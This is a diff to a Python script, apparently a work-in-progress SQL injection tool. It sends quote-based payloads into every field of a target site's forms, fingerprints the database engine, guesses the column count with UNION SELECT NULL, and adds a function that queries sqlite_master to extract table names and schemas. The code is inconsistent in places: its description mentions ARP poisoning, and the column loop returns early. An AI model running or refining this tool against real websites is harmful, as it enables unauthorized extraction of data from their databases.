@@ -7,12 +7,26 @@ import requests
 
 parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
 parser.add_argument("url", help="The URL of the website to test for sqli")
-# parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter the method")
+parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter the method")
 # parser.add_argument("o", help="Enter the output of archive file")
 
 args = parser.parse_args()
 entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
 session = HTMLSession()
+
+tables = {
+	"sqlite": "FROM sqlite_master"
+}
+infos = {
+	"sqlite": ["name", "sql"] # sql for colums, name for tables
+}
+
+def make_request(payload, method):
+	if method == "POST":
+		return requests.post(args.url, data=payload)
+	return requests.get(args.url + payload)
+
+
 
 def get_all_forms(url):
 	res = session.get(url)
@@ -38,18 +52,14 @@ def detect_database_engine(form_details, method):
 	engine = "Unknown"
 	for payload in entrypoints:
 		# value = ["eXample4TeSt"]
-		if method == "POST":
-			data = {}
-			for input_tag in form_details["inputs"]:
-				if input_tag["type"] != "submit":
-					data[input_tag["name"]] = payload
-			# data = {"login": "'", "password": "a"}
-			res = requests.post(args.url, data=data)
-		else:
-			res = requests.get(args.url + payload)
+		data = {}
+		for input_tag in form_details["inputs"]:
+			if input_tag["type"] != "submit":
+				data[input_tag["name"]] = payload
+		# data = {"login": "'", "password": "a"}
+		res = make_request(data, method)
 		html_response = res.text
 		engine = detect_engine(html_response)
-		print(html_response)
 		if engine != "Unknown":
 			working.append((engine, payload))
 	return working
@@ -61,19 +71,30 @@ def detect_number_of_columns(form_details, working, method):
 	columns = "NULL"
 	nb_colums = 1
 	while nb_colums > 0 and nb_colums < 20:
-		if method == "POST":
-			for input_tag in form_details["inputs"]:
-				if input_tag["type"] != "submit":
-					data[input_tag["name"]] = f"{working} UNION SELECT {columns} --"
-			res = requests.post(args.url, data=data)
-		else:
-			res = requests.get(args.url + f"{working} UNION SELECT {columns} --")
+		for input_tag in form_details["inputs"]:
+			if input_tag["type"] != "submit":
+				data[input_tag["name"]] = f"{working} UNION SELECT {columns} --"
+		res = make_request(data, method)
 		html_response = res.text
 		#if # analyze the response report incorrect number of columns
 		nb_colums += 1
 		columns += ",NULL"
 		return columns
 	return "Unknown"
+
+
+def get_infos(infos, entrypoint, nb_params, field, engine):
+	for i in range(1, nb_params):
+		infos += ", NULL"
+	injection = f"{entrypoint} UNION SELECT {infos} {tables[engine]}"
+	data={field: injection, "password": "aa"}
+	# if (args.x == "POST"):
+	res = requests.post(args.url, data=data)
+	# else:
+		# requests.get(args.url + injection)
+	html_response = res.text
+	print(html_response)
+	# need to parse response to find infos needed
 
 
 
@@ -111,18 +132,11 @@ def get_form_details(form):
 	details["inputs"] = inputs
 	return details
 
-def diff_page(old, new):
-	old = old.splitlines()
-	new = new.splitlines()
-	diff = ""
-	for i in range(len(old)):
-		if old[i] != new[i]:
-			diff += f"old: {old[i]}\nnew: {new[i]}\n"
-	return diff
-
 if __name__ == "__main__":
 	page = session.get(args.url)
 	forms = get_all_forms(args.url)
 	for form in forms:
 		form_details = get_form_details(form)
-		print(detect_database_engine(form_details, args.x))
+		engine = detect_database_engine(form_details, "POST")
+		print(engine)
+		# get_infos("name", "'", 2, "login", entry[0][0])
